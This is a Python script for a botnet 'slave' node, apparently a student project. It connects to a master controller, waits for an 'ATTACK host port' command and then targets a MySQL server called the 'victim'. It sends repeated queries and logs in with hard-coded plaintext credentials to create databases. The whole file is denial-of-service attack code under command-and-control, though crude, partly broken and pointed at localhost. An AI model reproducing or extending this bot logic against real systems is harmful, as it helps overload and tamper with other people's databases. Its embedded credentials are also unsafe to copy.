#!/usr/bin/python
import time, os, sys, string
from socket import *
from time import ctime
from mysql.connector import connect, Error

VICTIM_HOST = 'localhost'
VICTIM_PORT = 3306
MS_LISTEN_HOST = 'localhost'
MS_LISTEN_PORT = 8081


class Slave():
    def __init__(self, host, port, sock=None):
        print("initiating the slave instance")
        self.ddos = socket(AF_INET, SOCK_STREAM)
        print("DDoS mode loaded")
        self.host = host
        self.port = port
        self.message = 'asdf'
        ip = gethostbyname(self.host)
        self.num_connections = 0
        self.query = b"SELECT * FROM users"
        self.masterHost = MS_LISTEN_HOST
        self.masterPort = MS_LISTEN_PORT
        self.sockMaster = socket(AF_INET, SOCK_STREAM)
        self.sockMaster.connect((self.masterHost, self.masterPort))

    def __del__(self):
        print("deleting the instance")

    def acceptMessages(self):
        print("accepting messages")
        msg_buf = self.sockMaster.recv(64)
        msg_buf = msg_buf.decode("utf-8")
        if len(msg_buf) > 0:
            print(msg_buf)
            if msg_buf.startswith('ATTACK'):
                command, host, port = msg_buf.split()
                self.doTheDos(host, int(port))
            if msg_buf.startswith("CLOSE"):
                self.__del__()

    def doTheDos(self, host, port):
        print("conducting DDOS attack")
        self.ddos.connect((host, port))
        for _ in range(0, 5):
            self.dos(host, port)
        print("|[DDoS Attack Engaged] |")

    def dos(self, host, port):
        try:
            self.ddos.send(self.query)
            self.sendQuery()
        except error as msg:
            print("failed" + str(msg))

    def sendQuery(self):
        DBpassword = "botprojectbotproject"
        username = "adam"
        userPass = "adamadamadam"
        windowsServiceName = "MySQL80"
        databaseName1 = "abcde"
        try:
            with connect(
                    host=VICTIM_HOST,
                    user=username,
                    password=userPass,
            ) as connection:
                print(connection)
                show_db_query = "create database " + databaseName1
                with connection.cursor() as cursor:
                    cursor.execute(show_db_query)
                return connection
        except Error as e:
            print("error")
            print(e)


if __name__ == '__main__':
    slaveNode = Slave('localhost', 5000)
    slaveNode.acceptMessages()
